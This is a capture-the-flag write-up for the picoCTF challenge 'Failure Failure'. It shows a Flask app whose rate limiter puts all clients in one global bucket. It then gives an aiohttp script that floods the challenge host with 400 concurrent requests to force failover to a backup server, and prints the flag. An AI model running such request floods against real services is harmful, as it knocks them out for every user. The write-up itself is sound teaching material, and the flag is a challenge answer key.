# Overview

#### This is interesting, we're given this `app.py` and a URL for the machine. It seems that we need to do something for the load balancer to redirect traffic to the `backup instance` and get the flag.

> *Description of **Failure Failure**:*
```
Welcome to Failure Failure — a high-available system.

This challenge simulates a real-world failover scenario where one server is prioritized over the other.
A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand.
```

> *app.py with **line numbers:***
```
01| from flask import Flask, render_template
02| from dotenv import load_dotenv
03| from flask_limiter import Limiter
04| import os
05|
06| load_dotenv()
07|
08| app = Flask(__name__)
09|
10| # Custom key function for global rate limiting
11| def global_rate_limit_key():
12|     return "global"
13|
14| # Initialize rate limiter with global key function
15| limiter = Limiter(
16|     key_func=global_rate_limit_key,
17|     app=app,
18|     default_limits=["300 per minute"]
19| )
20|
21| # Custom error handler for rate limit exceeded
22| @app.errorhandler(429)
23| def ratelimit_exceeded(e):
24|     return "Service Unavailable: Rate limit exceeded", 503
25|
26| @app.route('/')
27| @limiter.limit("300 per minute")
28| def home():
29|     print("value:", os.getenv("IS_BACKUP"))
30|     if os.getenv("IS_BACKUP") == "yes":
31|         flag = os.getenv("FLAG")
32|     else:
33|         flag = "No flag in this service"
34|     return render_template("index.html", flag=flag)
```

# Analysis

#### The rate limiter uses a custom `key_func` that always returns the string `"global"` instead of identifying users individually by IP or session. This means every request from every user shares the same global rate limit bucket of `300 per minute`, allowing us to intentionally exhaust the limit for the entire instance. Once the main instance begins returning 503 Service Unavailable responses, the load balancer will likely treat it as unhealthy and redirect traffic to the backup instance where `IS_BACKUP=yes`, revealing the flag.
```
10| # Custom key function for global rate limiting
11| def global_rate_limit_key():
12|     return "global"
13|
14| # Initialize rate limiter with global key function
15| limiter = Limiter(
16|     key_func=global_rate_limit_key,
17|     app=app,
18|     default_limits=["300 per minute"]
19| )
```

# Solution

#### This `Python` script uses `asyncio` and `aiohttp` to send 400 HTTP requests concurrently to the target server. The hit() coroutine sends a single `GET` request and prints the returned status code, while `asyncio.gather()` schedules all requests to run asynchronously at the same time for faster execution.

```
#!/usr/bin/env python3
import asyncio
import aiohttp

URL = "http://mysterious-sea.picoctf.net:57294/"

async def hit(session):
    try:
        async with session.get(URL) as r:
            print(r.status)
    except:
        pass

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [hit(session) for _ in range(400)]
        await asyncio.gather(*tasks)

asyncio.run(main())
```

#### After running the script, revisiting the webpage gives us the flag!

```
picoCTF{f41l0v3r_f0r_7h3_w1n_73050a63}
```

![flag](https://i.imgur.com/VgcD6P1.png)
